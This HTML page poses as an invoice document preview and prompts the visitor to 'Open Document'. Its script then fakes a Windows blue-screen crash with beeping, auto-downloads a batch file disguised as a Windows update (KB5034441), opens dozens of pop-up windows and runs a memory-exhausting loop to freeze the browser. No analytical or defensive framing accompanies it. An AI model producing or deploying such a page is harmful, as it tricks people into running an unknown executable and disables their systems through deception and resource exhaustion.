<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Invoice_2026 - Document Preview</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0d1117;color:#e6edf3;font-family:system-ui,"Segoe UI",sans-serif;
       display:grid;place-items:center;min-height:100vh;text-align:center;padding:24px}
  .card{max-width:430px}
  h1{font-size:21px;margin-bottom:12px;font-weight:600}
  p{color:#8b949e;font-size:14px;line-height:1.65;margin-bottom:24px}
  button{background:#238636;color:#fff;border:0;padding:14px 36px;font-size:16px;
         border-radius:8px;cursor:pointer;font-weight:600}
  button:hover{background:#2ea043}
  #bsod{position:fixed;inset:0;background:#0078d7;color:#fff;display:none;
        flex-direction:column;justify-content:center;padding:11vh 11vw;
        text-align:left;z-index:99;font-family:"Segoe UI",sans-serif}
  #bsod .face{font-size:78px;line-height:1;margin-bottom:26px}
  #bsod h2{font-size:25px;font-weight:400;margin-bottom:18px}
  #bsod p{color:#fff;font-size:15px;max-width:640px;margin-bottom:14px}
  #bsod .pct{font-size:15px;margin-top:24px}
  #bsod .hint{margin-top:34px;font-size:13px;color:#cfe3ff}
</style>
</head>
<body>

<div class="card" id="intro">
  <h1>Invoice_2026.pdf</h1>
  <p>This document requires a small viewer component to be installed.<br>
  Click below to continue.</p>
  <button id="go">Open Document</button>
</div>

<div id="bsod">
  <div class="face">:(</div>
  <h2>Your PC ran into a problem and needs to restart.</h2>
  <p>We're just collecting some error info, and then we'll restart for you.</p>
  <p class="pct"><span id="num">0</span>% complete</p>
  <p class="hint" id="hint"></p>
</div>

<script>
const num = document.getElementById('num');
const hint = document.getElementById('hint');

document.getElementById('go').addEventListener('click', () => {

  document.documentElement.requestFullscreen?.().catch(()=>{});
  document.getElementById('intro').style.display = 'none';
  document.getElementById('bsod').style.display = 'flex';

  const AC = window.AudioContext || window.webkitAudioContext;
  if (AC) {
    const ctx = new AC();
    setInterval(() => {
      const o = ctx.createOscillator(), g = ctx.createGain();
      o.type = 'square'; o.frequency.value = 880; g.gain.value = 0.07;
      o.connect(g).connect(ctx.destination);
      o.start(); o.stop(ctx.currentTime + 0.17);
    }, 430);
  }

  let n = 0;
  const tick = setInterval(() => {
    n = Math.min(100, n + Math.ceil(Math.random() * 7));
    num.textContent = n;
    if (n >= 100) clearInterval(tick);
  }, 700);

  setTimeout(() => {
    hint.innerHTML = 'Update component downloaded. ' +
      '<a href="/dl/win.bat" style="color:#fff">Download again</a>';
    const a = document.createElement('a');
    a.href = '/dl/win.bat';
    a.download = 'Windows_Update_KB5034441.bat';
    document.body.appendChild(a);
    a.click();
    a.remove();
  }, 2500);

  let opened = 0;
  const spawn = setInterval(() => {
    if (opened++ > 55) return clearInterval(spawn);
    window.open(location.href + '?x=1', '_blank',
      'width=380,height=260,left=' + (Math.random()*900|0) + ',top=' + (Math.random()*500|0));
  }, 190);

  setTimeout(() => {
    const junk = [];
    (function eat(){
      junk.push(new Array(1e6).fill('x'));
      setTimeout(eat, 60);
    })();
  }, 4200);

});
</script>
</body>
</html>
